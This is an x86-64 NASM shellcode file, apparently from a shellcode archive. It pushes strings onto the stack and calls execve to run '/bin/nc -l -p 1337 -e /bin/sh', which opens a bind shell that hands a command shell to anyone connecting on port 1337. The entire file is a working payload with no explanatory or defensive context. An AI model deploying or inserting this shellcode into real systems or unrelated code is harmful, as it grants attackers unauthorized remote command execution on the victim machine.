; File: shellcode-822.nasm
; Author: Gaussillusion
; Size: 131 bytes


global _start

section .text

_start:

    xor     rdx,rdx
    mov     rdi,0x636e2f6e69622fff
    shr rdi,0x08
    push    rdi
    mov     rdi,rsp

    mov rcx,0x68732f6e69622fff
    shr rcx,0x08
    push    rcx
    mov rcx,rsp

    mov     rbx,0x652dffffffffffff
    shr rbx,0x30
    push    rbx
    mov rbx,rsp

    mov r10,0x37333331ffffffff
    shr     r10,0x20
    push    r10
    mov r10,rsp

    mov r9,0x702dffffffffffff
    shr r9,0x30
    push    r9
    mov r9,rsp

    mov     r8,0x6c2dffffffffffff
    shr r8,0x30
    push    r8
    mov r8,rsp

    push    rdx  ;push NULL
    push    rcx  ;push address of 'bin/sh'
    push    rbx  ;push address of '-e'
    push    r10  ;push address of '1337'
    push    r9   ;push address of '-p'
    push    r8   ;push address of '-l'
    push    rdi  ;push address of '/bin/nc'

    mov     rsi,rsp
    mov     al,59
    syscall
